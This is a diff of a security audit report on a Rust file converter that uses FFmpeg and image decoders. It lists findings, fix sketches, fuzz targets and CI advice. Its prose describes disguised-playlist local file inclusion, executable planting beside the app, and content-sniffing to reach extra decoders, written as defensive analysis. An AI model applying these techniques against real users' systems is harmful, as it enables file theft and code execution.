-"yaml" => serde_yaml::from_str(&text).context("invalid YAML")?,
+ffmpeg_command().args(["-y", "-hide_banner", "-loglevel", "error", "-i"]).arg(input)
+    .args(ffmpeg_args(target)).arg(output).output();
 ```
 
-`Cargo.toml:13` requests `serde_yaml = "0.9"`; `Cargo.lock:3293-3302` resolves `0.9.34+deprecated` and depends on `unsafe-libyaml`. `Cargo.lock:3832-3835` resolves `unsafe-libyaml 0.2.11`, which RustSec identifies as unmaintained. This is an unsafe-heavy parser directly receiving malicious-file bytes. The small Miri sample passed, but does not remove its maintenance risk. Other maintenance warnings are listed in section 3; zbus-family warnings partly describe migration into a new major package layout rather than abandonment of the whole ecosystem.
+- `.output()` blocks the worker with no timeout or cancel, and buffers **all** of stdout and stderr in memory. A corrupt stream can make FFmpeg log an error per packet even at `-loglevel error`.
+- No `-protocol_whitelist` or `-format_whitelist` is passed, so FFmpeg picks the demuxer by probing content. Historically that enabled HLS and concat playlists disguised as `.mp4`/`.avi` that pull **other local files** into the output (a "convert this and send it back" exfiltration pattern).
+- Argument handling is sound. There's no shell; `input` always follows `-i`, so a leading `-` can't become an option. Dialog and drop paths are absolute, so no `proto:` prefix can come from a filename. The output is a staged absolute path.
 
-**Impact:** outstanding advisory/build-policy failures and reduced assurance that future malformed-input bugs in an archived parser will be fixed. No concrete memory-corruption payload was found; this finding is not an invented parser exploit.
+**Probe (executed through the real backend, FFmpeg 2025-07-17).** I created `victim\secret.ts` (MPEG-TS audio), then attack files: HLS playlists naming it by absolute path, by `file:` URL, and by `../` relative path, saved as `.mp4` and as `.ts`, plus an `ffconcat` file saved as `.mp4`. **All five were rejected** (`End of file`, `Invalid data found`, `Operation not permitted`), and no output was published. This build's HLS extension checks and concat `safe=1` held. Older or differently configured FFmpeg builds were **not** tested. Because the app uses whatever `ffmpeg` is on PATH, its exposure is whatever that build's exposure is.
 
-**Fix sketch:** upgrade the dependency owners that retain the old XML version and retest Linux/macOS/Windows; replace the deprecated YAML backend with a maintained implementation after compatibility/resource-budget review. Merely adding a direct `quick-xml = "0.41"` dependency does not force transitive `0.30` users to change.
+**Fix sketch.**
 
 ```diff
- [dependencies]
-- eframe = "0.31"
-+ eframe = "<reviewed version with repaired accessibility dependency graph>"
-- serde_yaml = "0.9"
-+ <maintained_yaml_backend> = "<reviewed compatible version>"
+-.args(["-y", "-hide_banner", "-loglevel", "error", "-i"]).arg(input)
++.args(["-y", "-nostdin", "-hide_banner", "-loglevel", "error",
++       "-protocol_whitelist", "file",
++       "-format_whitelist", MEDIA_DEMUXERS,   // mov,mp4,m4a,matroska,webm,avi,mp3,wav,flac,ogg,aac,asf,flv,mpeg,mpegts,aiff
++       "-i"]).arg(input)
+-.output();
++.stderr(Stdio::piped()).spawn()?;   // read stderr into a capped ring buffer; wait with deadline; kill on cancel/timeout
 ```
 
-This placeholder sketch is deliberately not a valid manifest edit: no successor API/version was integration-tested. Commit the resulting lockfile after validation. Configure `cargo deny` with the project's actual license/source/advisory policy; use only documented, scoped, expiring advisory exceptions if reachability warrants one.
+Check `-format_whitelist` behaviour against the FFmpeg versions you support before relying on it.
 
-### Minor findings
+---
 
-#### MIN-01 — Silent data loss through duplicate keys and numeric inference
+### F-09 — Windows resolves `ffmpeg` and `explorer` from the application directory first (Low, Confirmed by std source)
 
-**Severity:** Low. **Status:** Confirmed.
+**Evidence.**
+- `Command::new("ffmpeg")` (`converter.rs:294`) runs automatically at **startup** (`main.rs:92` → `ffmpeg_available()`) and for every media job.
+- `Command::new("explorer")` (`main.rs:514`) runs on clicking "Done".
+- Rust std on Windows searches the child's PATH, then the **directory of the current executable**, then System32/Windows, then the parent's PATH (`library/std/src/sys/process/windows.rs`, `search_paths`, comments "1. Child paths … 2. Application path … 3 & 4. System paths").
 
-At `src/converter.rs:226-230`, collecting `(header, value)` pairs into a `Map` silently replaces previous entries with identical names. CSV `x,x\nfirst,second\n` became `[{"x":"second"}]`. YAML deserialized directly into `serde_json::Value` similarly accepts `{a: 1, a: 2}` as `{"a":2}`; the external Miri test confirms it. JSON into this map-shaped intermediate also has last-value-wins semantics; that JSON case was reviewed through the boundary rather than separately instrumented.
+**Scenario.** Someone copies `convertcraft.exe` to a shared or download folder; there are no official binaries, but users share builds. An `ffmpeg.exe` placed in the same folder runs with the user's privileges as soon as ConvertCraft starts, and an `explorer.exe` there runs on the first "Done" click. When the exe stays in `target/release/` as the README describes, the precondition is unrealistic. That's why this is Low. It's the same class as Windows DLL search-order planting, which affects most executables run from Downloads.
 
-At `src/converter.rs:240-245`, a CSV field first tries `i64`, then `f64`:
+**Fix sketch.** Launch `explorer` by absolute path (`%SystemRoot%\explorer.exe`). Resolve `ffmpeg` explicitly from `PATH`, excluding the exe directory, or from a user-configured path. Show the resolved path in the header tooltip.
 
-```rust
-if let Ok(i) = s.parse::<i64>() { return Value::from(i); }
-if let Ok(f) = s.parse::<f64>() {
-    if f.is_finite() { return Value::from(f); }
-}
+---
+
+### F-10 — Content sniffing reaches undeclared image decoders (Low, Confirmed)
+
+**Evidence.** `with_guessed_format()` (`converter.rs:140`) lets magic bytes override the extension. `image` is built with default features (`Cargo.toml:12`), so the EXR, HDR, DDS, farbfeld, and PNM decoders are compiled in and reachable, although `detect()` (`converter.rs:65-79`) and the README list only PNG/JPEG/WebP/BMP/GIF/TIFF/ICO/TGA/QOI/PNM.
+
+**Reproduction (executed).** I saved a 4×4 OpenEXR image as `photo.png` and converted it to BMP:
+
+```
+EXR bytes named .png decoded OK -> \\?\C:\Users\…\photo.bmp
 ```
 
-`18446744073709551615` (u64::MAX) became `1.8446744073709552e+19`, not its exact integer value. Identifiers with leading zeroes also lose formatting by design. `docs/formats.md:54-62` documents inference and duplicate CSV headers, so these are data-fidelity risks rather than claims of an undocumented general lossless guarantee. A sender can exploit duplicate/rounded IDs to mislead downstream consumers; ordinary files are affected too.
+**Impact.** It enlarges the attack surface with complex decoders (EXR is large, uses `rayon` threads, and decodes floating-point data) that the project never intended to support. No crash was found; this is an exposure, not a confirmed bug.
 
-**Fix sketch:** default to strings or offer an explicit schema; reject duplicate headers/keys where ambiguity matters; preserve unsigned integers before floating-point inference and do not silently float-convert out-of-range integer lexemes.
+**Fix sketch.**
 
 ```diff
-+ ensure!(unique_headers(&headers), "duplicate CSV headers");
-  if let Ok(i) = s.parse::<i64>() { return Value::from(i); }
-+ if let Ok(u) = s.parse::<u64>() { return Value::from(u); }
-+ if is_integer_lexeme(s) { return Value::String(s.to_owned()); }
+-image = "0.25"
++image = { version = "0.25", default-features = false, features = ["png", "jpeg", "webp", "bmp", "gif", "tiff", "ico", "tga", "qoi", "pnm"] }
 ```
 
-This does not solve arbitrary decimal precision; that requires an explicit representation policy. Use duplicate-rejecting visitors before map insertion if duplicate JSON/YAML keys should be errors.
+Then either decode with the extension's format (`ImageReader::with_format(ImageFormat::from_path(input)?)`) or reject a sniffed format that doesn't match the extension.
 
-#### MIN-02 — Suppressed import errors and colliding test fixtures
+---
 
-**Severity:** Info. **Status:** Confirmed.
+### F-11 — Dependency and build-policy gaps (Low; exploitability not established)
 
-- `src/main.rs:98-104` uses `if let Ok(entries)` and `entries.flatten()`: an inaccessible directory or per-entry failure disappears from the queue without an error. A user converting an unreadable subtree cannot distinguish an empty folder from failed enumeration. `src/converter.rs:139` discards `create_dir_all` errors; later file opening usually still returns an error, so this is diagnostic loss rather than a demonstrated success bypass.
-- `src/converter.rs:364-367` always uses `std::env::temp_dir().join("converter-tests")`; fixed filenames are reused without cleanup. Simultaneous test runs can overwrite each other's inputs/outputs. On shared Unix temp storage, pre-created paths/links can also redirect fixtures subject to OS ownership/link protections; that cross-user scenario was not tested on Windows.
+- **`quick-xml 0.30.0`** (RUSTSEC-2026-0194 quadratic duplicate-attribute check; RUSTSEC-2026-0195 unbounded `NsReader` namespace allocation; fixed in ≥0.41.0). It's reachable only through `zbus_xml`/`zbus-lockstep` in eframe's Linux AT-SPI stack, mainly at **proc-macro expansion** time, which reads XML from the build environment. **Not** reachable from converted files. Needs verification for runtime AT-SPI paths on Linux.
+- **`unsafe-libyaml 0.2.11`** (RUSTSEC-2024-0449, unmaintained), through `serde_yaml 0.9.34+deprecated`, **does parse attacker input** (`converter.rs:192`). Miri found no UB on the sample (§3.1), but nobody will fix future bugs in it.
+- Other unmaintained crates, all transitive through eframe: `paste`, `ttf-parser`, `zbus_names`, `zvariant`, `zvariant_derive`.
+- **No `deny.toml`**, **no CI workflow**, and no `#![forbid(unsafe_code)]`. Nothing stops a regression or a new advisory from shipping. Positives: `Cargo.lock` is committed, all sources come from crates.io, and there's no first-party `build.rs`.
 
-**Fix sketch:** propagate/display import and directory-creation errors; give each test/run an owned, unpredictable temporary directory.
+**Fix sketch.** Upgrade eframe when a release drops `zbus-lockstep 0.4` and `quick-xml 0.30`. Migrate YAML to a maintained backend after checking that crate's own RustSec record (some forks have advisories of their own). Add a `deny.toml` with a GPL-3.0-compatible license allowlist and scoped, expiring advisory ignores.
 
-```diff
-- std::fs::create_dir_all(parent).ok();
-+ std::fs::create_dir_all(parent).context("cannot create output directory")?;
-- let dir = std::env::temp_dir().join("converter-tests");
-+ let dir = tempfile::tempdir()?; // keep owner alive for the test
-```
+---
 
-Use an error-reporting import result instead of flattening directory errors. No stylistic Clippy suggestions are included as findings.
+### Minor (Info)
 
-## 6. Unsafe inventory and soundness review
+- **M-1 Data fidelity (Confirmed).** These are documented in `docs/formats.md:52-73`, but data still changes silently:
+  - CSV `id,x,x` / `18446744073709551615,first,second` / `00042,a,b` becomes `"id": 1.8446744073709552e+19, "x": "second"` and `"id": 42`. The duplicate header collapses, the value goes through `f64` (`converter.rs:237-243`), and the leading zeros are lost.
+  - Duplicate JSON and YAML keys are last-value-wins.
 
-### Complete first-party inventory
+  Fix: try `u64` before `f64`, keep integer lexemes out of range or with leading zeros as strings, and reject duplicate headers.
+- **M-2 Verbatim `\\?\` paths shown in the UI and passed to Explorer (Confirmed path form; Explorer behaviour Needs verification).** `plan()` canonicalizes the output directory (`output.rs:89-91`), so `Status::Done` holds `\\?\C:\…` (seen in the F-10 probe output). That reaches the tooltip and `explorer /select,\\?\C:\…` (`main.rs:514-516`). Explorer handles verbatim paths and comma-containing names poorly. "Show in folder" may open the wrong location, and a stem containing `,` could be split into extra arguments. Fix: strip the verbatim prefix (for example with the `dunce` crate) and use `SHOpenFolderAndSelectItems`.
+- **M-3 Swallowed import errors (Confirmed).** `if let Ok(entries)` and `.flatten()` (`main.rs:106-107`) silently drop unreadable directories and entries.
+- **M-4 UI-thread filesystem work (Confirmed).** The startup `ffmpeg -version` call (`main.rs:92`), traversal (F-01), and planning all run inside `update()`. Planning means canonicalize, `create_dir_all`, handle opens, and up to 10,000 `symlink_metadata` probes per job (`output.rs:96-131`). A slow network share or a directory pre-filled with `x (1)…x (9999)` names freezes the window.
+- **M-5 Identity on file systems without stable file IDs (Needs verification).** On Windows, `same_file` compares the volume serial plus the 64-bit `nFileIndex` (`same-file-1.0.6/src/win.rs:136-145`). On ReFS (128-bit IDs) or some SMB/FAT redirectors these may be zero or non-unique. Mostly this fails safe (spurious "aliases a protected source" errors or extra suffixes). It can, however, make the "destination changed" check at `output.rs:228` pass for a replaced file. Rename semantics still protect source content.
+- **M-6 Source swapped after planning (Info).** Converters reopen `input` by path (`converter.rs:138, 189`, and FFmpeg). If someone with write access to the *source* directory swaps the file for a FIFO or `/dev/zero` symlink after planning, the worker blocks or reads forever. That needs a live local attacker and is out of the baseline model.
 
-| Scope | Unsafe sites | Verdict |
-| --- | --- | --- |
-| `src/main.rs:1-440` | 0 | No first-party unsafe block/function/impl to classify. |
-| `src/converter.rs:1-441`, including tests | 0 | No first-party unsafe block/function/impl to classify. |
-| First-party `build.rs`, proc macros, FFI modules | None present | Not applicable. |
+---
 
-No first-party `extern "C"`, `repr(C)`, raw-pointer arithmetic, `MaybeUninit`, `transmute` invocation, `from_raw_parts`, manual `Send`/`Sync`, or custom `Drop` was found. The package name `transmute` is not a use of `std::mem::transmute`. `creation_flags` at `src/converter.rs:299` is a safe standard-library API call.
+## 6. Unsafe inventory
 
-No safe first-party wrapper was demonstrated to expose undefined behavior. This conclusion is limited to the reviewed implementation and probes, not a certification of safe dependencies. Resource exhaustion, application panics, lost I/O errors, and unsafe Rust are distinct concerns.
+| Scope | `unsafe` sites | Verdict |
+|---|---|---|
+| `src/main.rs` (526 lines) | 0 | n/a |
+| `src/converter.rs` (618 lines) | 0 | n/a |
+| `src/output.rs` (520 lines) | 0 | n/a |
+| `build.rs`, proc macros, FFI | none present | n/a |
 
-### Sampled dependency boundary: YAML
+There is no first-party `extern "C"`, `repr(C)`, raw pointer, `MaybeUninit`, `transmute`, `from_raw_parts`, manual `Send`/`Sync`, or custom `Drop`. The safe-std-wrapper calls `CommandExt::creation_flags` (`converter.rs:297-299`) and `MetadataExt::file_attributes` (`output.rs:266-268`) need no unsafe. **Soundness verdict for first-party code: sound** (nothing to violate). Recommend adding `#![forbid(unsafe_code)]` to keep it that way.
 
-Dependency files below are relative to the local registry source `serde_yaml-0.9.34+deprecated/`. These are a supplemental inventory of the two inspected unsafe wrapper files, **not every unsafe site in all 490 dependencies**. “Unverified” means the full lower-level invariant was not proven; it is not an assertion of unsoundness.
+Dependency unsafe code reached by attacker input was **not** verified line by line: `unsafe-libyaml` and its `serde_yaml` wrapper, the `image`/`png`/`zune-jpeg`/`exr`/`tiff`/`gif`/`image-webp` codecs, and `same-file`/`tempfile`/`winapi-util` (Win32 calls). Geiger couldn't produce counts (§3.1). Coverage is limited to the Miri samples in §3.1 and reading `same-file`'s identity logic and `tempfile`'s Windows persist path (`tempfile-3.27.0/src/file/imp/windows.rs:84-113`, which clears `FILE_ATTRIBUTE_TEMPORARY` before the move, so published outputs don't keep the temporary attribute).
 
-| Site(s) | Operation / invariant considered | Verdict |
-| --- | --- | --- |
-| `src/libyaml/parser.rs:70-79` | Allocate/pin parser storage, initialize native-shaped state, store borrowed/owned input, then assume initialization. Requires successful initializer to fully initialize state and correct stable input lifetime. | Unverified end-to-end; order/lifetime strategy inspected. |
-| `src/libyaml/parser.rs:85-100` | Parse into MaybeUninit event, check success, read event, copy/borrow result, delete event. Depends on parser success contract and valid event tags/lengths. | Unverified. |
-| `src/libyaml/parser.rs:104` | Unsafe `convert_event` entry: assumes a valid initialized tagged union and corresponding input buffer. | Unverified caller/callee contract. |
-| `src/libyaml/parser.rs:114,117,118,119-121,122` | Alias/scalar union accesses; non-null scalar pointer and valid length for `from_raw_parts`; strings must remain valid until copied. | Unverified lower-level guarantees; no violation observed in probes. |
-| `src/libyaml/parser.rs:137,138,142,143` | Sequence/mapping union pointer fields selected by event tag. | Unverified. |
-| `src/libyaml/parser.rs:151,153,157,159` | Unsafe anchor/tag helper definitions and C-string conversions. Nulls are checked via NonNull; non-null still requires readable, terminated storage. Copies occur before event deletion. | Unverified termination/allocation invariants. |
-| `src/libyaml/parser.rs:199` | Parser deletion in Drop requires initialized owned parser and exactly-once destruction. | Unverified lower-level destructor contract. |
-| `src/libyaml/util.rs:16` | `NonNull::new_unchecked(Box::into_raw(boxed))`. Box's allocated pointer is non-null. | Sound for this local non-null conversion. |
-| `src/libyaml/util.rs:21-27` | Unsafe `Owned::assume_init`; transfers ownership with `mem::forget` then casts pointer. Caller must have initialized T. | Unverified at all callers; parser initialization caller inspected. |
-| `src/libyaml/util.rs:40` | Reference reinterpretation to transparent pointer wrapper; requires matching layout/provenance and valid aliasing. | Unverified. |
-| `src/libyaml/util.rs:46` | Reconstruct Box during Drop; requires unique original allocation, correct type/layout, and exactly-once ownership. | Unverified across all callers. |
+---
 
-The inspected wrapper uses null checks for optional strings and copies event-owned bytes before deleting events. It contains unsafe invariants not fully documented as `SAFETY` comments; validating them would require reviewing unsafe-libyaml's allocation, scanner/parser, and failure paths. The in-memory Miri sample exercises part of this boundary but is not exhaustive. No “unsound” verdict is assigned without a demonstrated contract violation.
+## 7. Coverage
 
-Native FFmpeg/graphics/OS code and unsafe internals of other image/GUI dependencies remain **unverified**. Geiger's failed run is not used to infer their safety.
+**Reviewed in depth (every line):** `src/output.rs`, `src/converter.rs`, `src/main.rs`, including all 20 tests; `Cargo.toml`; the lockfile advisory paths; and the README and `docs/*.md` claims about behaviour.
 
-## 7. Coverage and limits
+**Dependency code read for specific questions:**
+- `same-file 1.0.6`: the Unix and Windows `Handle` implementations.
+- `winapi-util 0.1.11`: `from_path_any` open flags. It uses std's default share mode (read, write, and delete), so source files stay deletable while a batch holds handles.
+- `tempfile 3.27.0`: Windows create and persist.
+- `image 0.25.10`: `Limits` and the default feature set.
+- Rust std: Windows `resolve_exe` / `search_paths`.
 
-### Reviewed in depth
+**Concurrency review conclusions:**
+- There is no async runtime.
+- There are two mutexes: the job queue (held only for `pop`) and `ProtectedInputs.publication` (held across one commit; no nested locking, so no lock-order cycle).
+- The mpsc channel is unbounded but carries at most 2 messages per job.
+- There are no `Arc` cycles, and no interior mutability shared without synchronisation.
 
-- All of `src/converter.rs`: classification/target restrictions, filename planning, output dispatch, image decode/normalization/encoding, data parsers and serializers, CSV inference/export, FFmpeg construction/result handling, and all four tests.
-- All of `src/main.rs`: initialization, dialogs/drop paths, recursive import, UI gating, planning/scheduling, mutex/channel lifetimes, counters/statuses, output reveal, and shutdown ownership.
-- `Cargo.toml`, lockfile source/version/advisory relationships, README, and conversion/development documentation relevant to promised behavior.
-- Targeted reproductions of CC-01/02/03/05/06/07 and MIN-01; parser-level Miri cases described above.
+**Not reviewed or not proven:**
+- The internals of 491 transitive crates, the FFmpeg codecs and demuxers beyond the five inclusion probes, and the graphics, windowing, and portal stacks.
+- Linux and macOS at runtime. The F-04 `EMFILE` threshold is inferred; WSL had no Rust toolchain.
+- GUI automation: the F-01 replica stands in for `App::add_path`.
+- Fuzzing campaigns.
+- `reveal()`'s actual Explorer behaviour (M-2): not launched, to avoid opening windows on the desktop.
 
-### Concurrency and lifecycle conclusions
-
-- There is one first-party queue mutex. Its guard ends after the `let Some(job) = ... else ...;` statement, before conversion. No lock-order cycle, mutex-held-across-await, async runtime, or first-party interior-mutability data race was found.
-- Queue entries and worker indices remain stable while running because editing/removal/import is gated. Internal channel messages are not an attacker-accessible IPC protocol. The shared queue is an Arc without a reference cycle visible in first-party code.
-- Detached worker handles are not joined or cancelled. A worker panic would drop its sender without a Finished message; disconnected handling only clears `rx` (`src/main.rs:185-187`), leaving stale status/progress. No concrete file that panics a decoder was found, so this is a robustness coverage gap, not a separately confirmed exploit.
-- There is no cooperative shutdown for FFmpeg children (`src/main.rs:158-167`, `src/converter.rs:337-342`). Closing the application may leave a child to continue until it exits or encounters closed pipes, depending on OS/child behavior. A close-during-conversion test was not performed. Cancellation/process-group ownership should be designed before adding cancel controls.
-- Filesystem operations in import/planning and startup's FFmpeg probe run on the UI thread. Conversion I/O and child waiting run on bounded worker threads, so they are not blocking an async executor. Existing workers nevertheless lack resource/deadline controls (CC-05).
-
-### Other security categories checked
-
-- **Command injection:** first-party commands use `Command` argument APIs, not a shell, and encoding arguments come from fixed strings. No shell-metacharacter injection found. Input path follows `-i`. Bare executable resolution remains a trusted-environment assumption. Relative paths beginning with option-like text and all platform reveal edge cases were not dynamically exercised.
-- **Path traversal:** targets are fixed UI values and the output stem comes from `Path::file_stem`; no untrusted arbitrary target string reaches the public-in-module helper through the UI. The actual problems are links, identity, races, and unintended traversal, not a demonstrated `../../` string injection into `target`.
-- **Deserialization:** data is parsed into ordinary `serde_json::Value`, not executed as code or deserialized into a custom gadget/plugin system. Allocation, aliases, lossy representations, duplicate keys, and output formula interpretation remain relevant.
-- **Crypto/secrets/TLS/auth/SQL/templates:** no first-party implementation or hardcoded secret was found. No timing/nonce/RNG/zeroization finding is applicable to this application's own functionality. No TLS-verification disabling was present in first-party source. This does not audit FFmpeg's network stack.
-- **Drop/error handling:** JPEG buffering was a real unchecked Drop-side-effect path (CC-06). Most other fallible conversion operations use `?`; error suppression and destructive cleanup were separately identified. The converter's `pub` functions are inside a private binary module, so they are not a published semver-stable library API. They would need stronger validated types/preconditions before reuse as a public library.
-
-### Dependency code sampled / skimmed
-
-- `image 0.25.10` reader/decoder limits and format dispatch; JPEG encoder finalization.
-- `serde_yaml 0.9.34+deprecated` recursion/alias protections, parser unsafe wrapper, and owned-storage utility.
-- `atspi-common`, `zbus-lockstep`, and `zbus-lockstep-macros` for old quick-xml reachability. Macro source reads local XML and emits validation-related code; no malicious behavior was established in the inspected path.
-- `rfd 0.15.4/build.rs`: platform linking/backend checks; no suspicious behavior in that file.
-- Build-script/proc-macro target inventory, registry source checks, cached yank flags, and RustSec/deny results across the lockfile.
-
-### Not reviewed or not proven
-
-- Full source/safety audit of 490 registry dependencies, 87 build-script packages, 41 proc-macro packages, generated bindings, Rust stdlib, graphics drivers, native desktop libraries, FFmpeg codecs/demuxers/protocols, or spreadsheet software.
-- Release/optimized builds, 32-bit targets, Linux/macOS runtime behavior, cross-compilation success, GUI automation, accessibility/portal IPC adversarial testing, and platform file-manager edge cases.
-- Exhaustive decoder fuzzing; long-running fuzz campaigns; actual OOM/disk-full/process-kill stress tests; deliberately crashing the GUI with cyclic trees; exploitability of each upstream unsafe site/advisory.
-- No newly added test or source patch was committed. Diff sketches were not compiled as fixes and should not be applied without completing their helper/API designs.
-
-The absence of a first-party `build.rs` or git dependency is verified. The absence of suspicious behavior in every transitive build script is **not** claimed.
+---
 
 ## 8. Recommendations
 
-### Prioritized remediation
+### Fix order
+1. F-01: background, iterative, non-link-following import with visited set and budgets.
+2. F-02 / F-03: explicit image dimension and RGBA budgets, data input-size and CSV cell budgets, CSV streamed into the staged file, and a global memory/concurrency semaphore.
+3. F-04 / F-06: identity keys instead of open handles; per-row planner errors.
+4. F-07 / F-08: `catch_unwind`, a cancel flag, owned and killable FFmpeg children with a deadline and capped stderr, and demuxer/protocol allowlists.
+5. F-10 / F-11 / F-09: trim `image` features, then add dependency policy and CI, and launch external programs by absolute path.
 
-1. **Unify output writing under an owned transaction abstraction.** Enforce atomic no-clobber, preserve pre-existing outputs on all failures, protect all source identities, and explicitly flush before reporting Done. Handle Windows case/alias behavior and same-directory atomic replacement semantics.
-2. **Bound work before and during parsing/conversion.** Add import depth/file/time limits, link policy, data expansion budgets, CSV row/column/cell bounds, strict image dimension limits, aggregate memory/concurrency control, and bounded FFmpeg output capture/deadlines.
-3. **Make traversal and lifecycle cancellable.** Move recursive import/planning off the UI thread; own/join worker and child-process lifetimes; report panics/failures consistently without silently leaving Running entries.
-4. **Address export fidelity and spreadsheet policy.** Reject ambiguous duplicate fields where appropriate; use explicit string/numeric schema options; provide tested spreadsheet-safe export semantics.
-5. **Repair and continuously verify dependency health.** Update transitive owners of vulnerable quick-xml, evaluate a maintained YAML implementation, set an intentional deny policy, and keep the lockfile reviewed/committed.
+### Fuzz targets worth adding
 
-### Fuzz targets and meaningful regression tests
+The crate is bin-only, so first move `converter` and `output` into a `lib.rs` so `cargo-fuzz` can link them.
 
-- **`data_json_to_value`** — `serde_json::from_str::<Value>` at `src/converter.rs:195`: duplicate keys, deep structures, extreme numbers, malformed Unicode; assert bounded failure/success without panic.
-- **`data_yaml_to_value`** — `serde_yaml::from_str::<Value>` at `:196`: aliases, repeated large scalars, cycles, undefined anchors, complex/non-string keys, tags, invalid UTF-8 at the input boundary, and malformed event transitions. Enforce expanded-node/byte budgets and run representative seeds in Miri for any retained unsafe backend.
-- **`data_toml_to_value`** — `toml::from_str::<Value>` at `:197`: nested/dotted tables, duplicate definitions, huge arrays/strings, datetime and numeric representation compatibility; round-trip invariants only where the conversion contract promises them.
-- **`csv_read`** — `read_csv` at `:220`: duplicate/empty headers, huge fields/records, quote/newline combinations, unequal widths, large integers, exponent forms, empty fields; assert explicit fidelity and size policies.
-- **`csv_write`** — `write_csv` at `:255`: disjoint-key sparse rows, heterogeneous objects, nested values, dangerous header/value prefixes; assert cell/output budgets before large allocation.
-- **`image_decode_reencode`** — `ImageReader::with_guessed_format().decode()` at `:151-155`, then normalization and target encoders: malformed headers/metadata, extreme dimensions, format-vs-extension mismatches, 16-bit inputs, and encoder-size limitations. Run in a memory/time-limited process; include the 65,536×1 PNG-to-JPEG sentinel-preservation regression.
-- **`output_transaction_properties`** — exercise `plan_output`/future commit API with fake and real filesystems: case collisions, hard links, symlinked parents, dangling links, cross-job input cycles, existing files arriving after planning, concurrent instances, permission failures, full-disk/short-write/flush faults. Assert old data survives failure and no protected input is changed.
-- **`folder_import_graph`** — bounded generated directory graphs and platform links/junctions for `App::add_path`/replacement importer. Assert termination, file caps, identity deduplication, cancellation, error visibility, and UI responsiveness.
-- **`ffmpeg_media_boundary`** — a subprocess corpus of malformed media and format-mismatch/playlist inputs, using a pinned/tested FFmpeg build inside time/memory/network limits. Assert failure cannot delete old outputs and application shutdown/cancellation reaps children. Do not treat cargo-fuzz as an in-process memory-safety auditor for the external FFmpeg executable.
+| Target | Function / call site | What to assert |
+|---|---|---|
+| `fuzz_json_value` | `serde_json::from_str::<Value>` (`converter.rs:191`) → every serializer (`:198-211`) | no panic; output size ≤ k·input |
+| `fuzz_yaml_value` | `serde_yaml::from_str::<Value>` (`:192`) → serializers | no panic or UB (also run the corpus under Miri); expansion budget respected |
+| `fuzz_toml_value` | `toml::from_str::<Value>` (`:193`) and `toml::to_string_pretty` (`:207`) | no panic; nulls produce errors, not panics |
+| `fuzz_read_csv` | `read_csv` (`:217`) and `infer_scalar` (`:233`) | no panic; documented typing rules (round-trip integers exactly) |
+| `fuzz_write_csv` | `write_csv` (`:252`) on arbitrary `Value` | cell and byte budget enforced before allocating |
+| `fuzz_image_convert` | `ImageReader::with_guessed_format().decode()` (`:138-142`) → each target branch (`:145-171`) | under an RSS/time cap: no panic; respects F-02 limits; ICO resize bounded |
+| `prop_output_planner` | `OutputPlanner::new` / `plan` / `begin` / `commit` (`output.rs`) | property tests over random names, cases, hard links, symlinks, pre-existing files, and concurrent planners: no protected input modified, no clobber when the destination was absent at planning time |
+| `prop_folder_scan` | replacement for `App::add_path` | random directory graphs with links: terminates within budget, each file once |
 
-Use fresh per-test temporary directories. Prefer bounded adversarial regression cases over crashing the main test process or actually filling storage. The existing four happy-path tests do not cover these invariants.
+Seed corpora with the probes from this audit: sparse JSON, the YAML alias file, the 16384² PNG, EXR-as-PNG, the junction loop, and the dangling-symlink row.
 
-### CI checks and lints
+### CI and lints
 
-- Run `cargo check --locked --all-targets --all-features`, `cargo test --locked --all-features`, and Clippy with the reviewed warning set on supported platforms. Ensure at least one CI lane actually installs FFmpeg and fails if media tests would skip.
-- Add `#![forbid(unsafe_code)]` to the first-party crate while it remains entirely safe Rust. This constrains first-party/generated usage, not unsafe inside dependencies.
-- Enforce `unused_must_use`, and gate new production `unwrap`/`expect`/`panic`/unchecked indexing with narrow, documented exceptions for proven invariants. Do not blindly deny every pedantic/test warning; resolve or justify specific ones. Enable `unsafe_op_in_unsafe_fn` and documented unsafe-block checks if unsafe code is ever introduced under a deliberately changed policy.
-- Run `cargo audit` and a configured `cargo deny check` regularly; explicitly track all-target advisories separately from confirmed runtime exposure. Do not blanket-ignore unmaintained/advisory classes.
-- Keep a reproducible lockfile and use `--locked` for binary builds. Review feature growth, build/proc-macro changes, source changes, and optional decoder backends. The default `image` feature set is broader than the UI's advertised input list because content guessing is used.
-- Run pure parser Miri tests on a supported platform without native GUI/filesystem dependencies where possible. Separate backend logic into a testable library only as a future development change; it was not done for this audit.
-- Run sanitizer/fuzz jobs and platform filesystem integration tests on schedule. A successful compiler, Clippy, or Miri sample does not replace output-integrity/race tests.
-
-**Review completion:** all first-party Rust modules were reviewed. Repository source/manifest/lockfile preservation was checked with Git; only this report is intended as a tracked change.
+- Add a CI workflow (there is none). On Windows, Linux, and macOS, run `cargo check --locked --all-targets`, `cargo test --locked` with FFmpeg installed (fail if the media tests skip), and, on Windows, a lane with Developer Mode so the symlink tests can't silently skip.
+- Run `cargo audit` and `cargo deny check` with a committed `deny.toml` covering licenses (GPL-3.0-compatible allowlist), bans (duplicates as warnings), sources (crates.io only), and advisories (no blanket ignores).
+- Add `#![forbid(unsafe_code)]` at the crate root.
+- Add Clippy, `-D warnings` on the bin target, with `clippy::unwrap_used`, `expect_used`, `panic`, and `indexing_slicing` denied in non-test code (`#[cfg_attr(test, allow(...))]`). Keep `arithmetic_side_effects` as a warning.
+- Add a scheduled Miri job for the pure parser tests, and a nightly `cargo fuzz` run for the targets above with short time budgets.
+- Pin or record a minimum FFmpeg version in docs, and test the F-08 inclusion corpus against it.
